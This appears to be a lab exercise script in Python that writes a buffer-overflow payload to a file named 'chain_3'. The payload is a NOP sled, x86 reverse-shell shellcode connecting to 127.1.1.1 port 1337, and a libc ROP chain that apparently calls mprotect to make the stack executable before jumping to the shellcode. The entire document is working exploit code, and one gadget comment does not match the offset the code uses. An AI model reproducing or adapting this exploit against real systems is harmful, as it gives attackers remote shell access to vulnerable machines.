#!/usr/bin/python3
import sys

# Initialize the content array
content = bytearray(0x90 for i in range(500))

# The size of shellcode is 74 bytes, less than BUF_SIZE, so we can put the shellcode before the ROP chain
shellcode = b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
content[0:len(shellcode)] = shellcode

# The address of libc
libc_addr = 0xb7e08000

# The address of ld
ld_addr = 0xb7fdb000

# The address of the return address in memory
return_addr_location = 0xbfffe83c

# The address of buffer (shellcode)
buffer_addr = 0xbfffe6c2

# Calculate the offset between buffer address and address of return address
offset = return_addr_location - buffer_addr

# 0x000e8c12: mov edx, 0; cmovb eax, edx; ret;
gadgets1 = 0x000e8c12 + libc_addr

# 0x00025c65: inc edx; ret; *7
gadgets2 = 0x00025c65 + libc_addr

# 0x000b1b80: mov eax, 0x7e; pop ebx; ret;
gadgets3 = 0x000b1b80 + libc_addr

# address of stack - 1, no zero bytes
stack_addr = 0xbffdefff

# 0x0011f836: dec eax; ret;
gadgets4 = 0x0011f836 + libc_addr

# 0x00003960: inc ebx; ret;
gadgets5 = 0x00003960 + libc_addr

# 0x000b5467: pop ecx; ret;
gadgets6 = 0x000b5467 + libc_addr

# dummy number for size parameter of mprotect, no zero bytes, larger than 0x21000
dummy_num = 0x01010101

# 0x00002c87: int 0x80; ret;
gadgets7 = 0x00000a00 + ld_addr

# new buffer address (I reboot the system and the address of buffer is changed)
new_buffer_addr = 0xbfffe702

# Generate the payload
content[offset:offset+4] = (gadgets1).to_bytes(4,byteorder='little')
content[offset+4:offset+32] = (gadgets2).to_bytes(4,byteorder='little') * 7
content[offset+32:offset+36] = (gadgets3).to_bytes(4,byteorder='little')
content[offset+36:offset+40] = (stack_addr).to_bytes(4,byteorder='little')
content[offset+40:offset+44] = (gadgets4).to_bytes(4,byteorder='little')
content[offset+44:offset+48] = (gadgets5).to_bytes(4,byteorder='little')
content[offset+48:offset+52] = (gadgets6).to_bytes(4,byteorder='little')
content[offset+52:offset+56] = (dummy_num).to_bytes(4,byteorder='little')
content[offset+56:offset+60] = (gadgets7).to_bytes(4,byteorder='little')
content[offset+60:offset+64] = (new_buffer_addr).to_bytes(4,byteorder='little')


# Write the content to chain_3
file = open("chain_3", "wb")
file.write(content)
file.close()
